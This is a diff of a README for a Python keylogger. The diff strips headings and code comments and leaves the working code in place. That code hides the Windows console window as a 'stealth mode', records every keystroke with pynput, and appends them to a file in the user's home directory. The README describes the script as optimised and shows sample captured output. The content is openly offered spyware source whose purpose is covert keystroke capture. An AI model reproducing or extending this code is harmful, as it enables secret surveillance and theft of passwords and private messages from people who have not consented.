@@ -95,13 +95,11 @@ After reviewing and testing the original code, I made the following improvements
 - **Stealth Mode**: The script now runs silently in the background by hiding the console window on Windows systems.
 - **File Output**: Keystrokes are appended efficiently to the output file.
 
-## Example Output
 
 Here’s a snapshot of the keylogger running and capturing keystrokes:
 
 ![output example](https://github.com/user-attachments/assets/e51a1bb4-287e-46aa-ad66-9eca01be9286)
 
-## Updated Code
 
 Here’s the optimized Python keylogger code:
 
@@ -111,14 +109,11 @@ from pynput import keyboard
 import win32console
 import win32gui
 
-# Hide the console window (Windows only)
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
-# Define the log file path (in the user's home directory)
 log_file_path = os.path.join(os.path.expanduser("~"), "output.txt")
 
-# Function that is called whenever a key is pressed
 def press(key):
     try:
         key_str = str(key).replace("'", "")  # Clean up the key string
@@ -136,13 +131,11 @@ def press(key):
             print("Shutting down keylogger...")
             return False
 
-        # Append the key press to the log file
         with open(log_file_path, 'a') as f:
             f.write(key_str)
 
     except Exception as e:
         print(f"Error: {e}")
 
-# Start the listener to capture keystrokes
 with keyboard.Listener(on_press=press) as listener:
     listener.join()
